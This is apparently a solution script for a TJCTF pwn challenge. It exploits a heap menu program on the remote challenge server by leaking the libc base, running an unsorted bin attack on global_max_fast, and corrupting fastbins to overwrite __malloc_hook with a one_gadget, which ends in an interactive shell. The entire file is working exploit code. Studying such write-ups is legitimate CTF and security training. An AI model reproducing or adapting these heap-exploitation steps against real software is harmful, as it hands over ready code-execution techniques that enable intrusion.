from ptrlib import *
import ctypes

def create_array(size):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))

def delete_array(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("> ", str(index))

def view_element(index, offset):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", str(index))
    sock.sendlineafter("> ", str(offset))
    return sock.recvline().rstrip()

def edit_element(index, offset, value):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(index))
    sock.sendlineafter("> ", str(offset))
    sock.sendlineafter("> ", str(value))

libc = ELF("./libc.so.6")
sock = Socket("p1.tjctf.org", 8012)
#sock = Socket("127.0.0.1", 9999)
main_arena = 0x3c4b20
global_max_fast = 3958776
delta = 0x58
one_gadget = 0xf1147

# libc leak
create_array(0x80 // 8) # 0
create_array(0x80 // 8) # 1
delete_array(0)
libc_base = int(view_element(0, 0), 10) - main_arena - delta
logger.info("libc base = " + hex(libc_base))
logger.info("global_max_fast = " + hex(libc_base + global_max_fast))

# allocate for future use
create_array(0xe0 // 8) # 2
create_array(0xe0 // 8) # 3
create_array(0xe0 // 8) # 4

# unsorted bin attack on global_max_fast
create_array(0x90 // 8) # 5
create_array(0xa0 // 8) # 6
delete_array(5)
edit_element(0, (0xf0 * 3 + 0x90 + 0x90) // 8, libc_base + global_max_fast - 0x10)
create_array(0x90 // 8) # 7

# fastbin corruption attack (Stage 1)
delete_array(2)
delete_array(3)
delete_array(4)
# fastbin-->4-->3-->2
edit_element(3, 0xe8 // 8, libc_base + libc.symbol("__malloc_hook") - 0x175)
# fastbin-->7-->__malloc_hook-0x175
create_array(0xe0 // 8) # 8
create_array(0xe0 // 8) # 9
edit_element(9, 0xd8 // 8, 0xf1 << 40)

# fastbin corruption attack (Stage 2)
delete_array(4)
# fastbin-->4-->?
edit_element(3, 0xe8 // 8, libc_base + libc.symbol("__malloc_hook") - 0x88)
# fastbin-->4-->__malloc_hook-0x88
create_array(0xe0 // 8) # 10
create_array(0xe0 // 8) # 11
edit_element(11, 0x70 // 8, libc_base + one_gadget)

# get the shell!
create_array(0x100 // 8)

sock.interactive()
